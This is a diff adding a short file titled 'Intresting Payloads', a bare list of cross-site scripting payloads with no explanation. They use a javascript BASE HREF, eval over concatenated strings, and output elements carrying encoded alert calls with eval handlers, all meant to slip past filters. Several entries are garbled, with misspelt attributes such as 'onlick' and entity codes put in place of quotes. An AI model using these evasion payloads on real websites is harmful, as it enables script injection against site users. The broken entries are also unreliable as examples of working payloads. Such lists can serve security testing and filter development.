@@ -1,0 +1,11 @@
+Intresting Payloads
+&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
+
+a=\"get\";b=\"URL(\\"\";c=\"javascript&#058;\";d=\"alert('XSS');\\")\";eval(a+b+c+d);
+a=\&lparget\&rpar;b=\&lparURL(\\&lpar\&rpar;c=\&lparjavascript&#058;\&rpar;d=\&lparalert('XSS');\\&rpar)\&rpar;eval(a+b+c+d);
+
+<output name-"javascript://&newline;\u0061ler&#116(1)" onlick="eval(name)">X</output>
+<output name=&lparjavascript://&newline;\u0061ler&#116(1)&rpar onlick=&lpareval(name)&rpar>X</output>
+
+
+
